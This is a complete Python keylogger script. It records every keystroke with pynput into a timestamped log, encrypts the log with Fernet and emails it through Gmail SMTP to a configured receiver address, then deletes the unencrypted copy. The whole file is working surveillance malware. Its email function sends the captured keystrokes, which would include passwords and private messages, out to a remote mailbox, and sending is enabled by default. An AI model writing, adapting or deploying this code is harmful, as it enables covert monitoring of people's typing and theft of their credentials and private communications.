import os
import logging
import smtplib
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
from email.message import EmailMessage

# === CONFIGURATION ===

# Filenames
LOG_FILE = "keylog.txt"
ENCRYPTED_FILE = "keylog.encrypted"
KEY_FILE = "secret.key"

# Hotkey to exit the keylogger
EXIT_HOTKEY = keyboard.Key.esc

# Email configuration (set EMAIL_ENABLED to True to enable sending)
EMAIL_ENABLED = True
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password_here"  # Use your Gmail App Password here (see README for instructions)
EMAIL_TO = "receiver_email@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# === FUNCTION DEFINITIONS ===

def generate_key():
    """Generate and store a new encryption key."""
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)

def load_key():
    """Load and return the previously generated key."""
    return open(KEY_FILE, 'rb').read()

def encrypt_file():
    """Encrypt the keylog file using Fernet symmetric encryption."""
    if not os.path.exists(KEY_FILE):
        generate_key()
    key = load_key()
    fernet = Fernet(key)
    
    with open(LOG_FILE, 'rb') as file:
        original = file.read()

    encrypted = fernet.encrypt(original)
    with open(ENCRYPTED_FILE, 'wb') as enc_file:
        enc_file.write(encrypted)

def send_email():
    """Send the encrypted log file as an email attachment."""
    msg = EmailMessage()
    msg['Subject'] = 'Encrypted Keylogger Report'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_TO
    msg.set_content('Attached is the encrypted keystroke log.')

    with open(ENCRYPTED_FILE, 'rb') as file:
        msg.add_attachment(file.read(), maintype='application', subtype='octet-stream', filename='keylog.encrypted')

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# Set up logging to file with timestamp
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    """Handler for key press events."""
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

def on_release(key):
    """Handler for key release events. Exits on hotkey and triggers encryption/email."""
    if key == EXIT_HOTKEY:
        print("[*] Exit hotkey pressed. Encrypting log and shutting down...")
        listener.stop()
        encrypt_file()
        if EMAIL_ENABLED:
            send_email()
        os.remove(LOG_FILE)  # Remove unencrypted log

def start_keylogger():
    """Start the keylogger listener in a dedicated thread."""
    global listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# === MAIN EXECUTION ===
if __name__ == "__main__":
    print("[*] Keylogger started... Press ESC to exit and encrypt the log.")
    thread = threading.Thread(target=start_keylogger)
    thread.start()
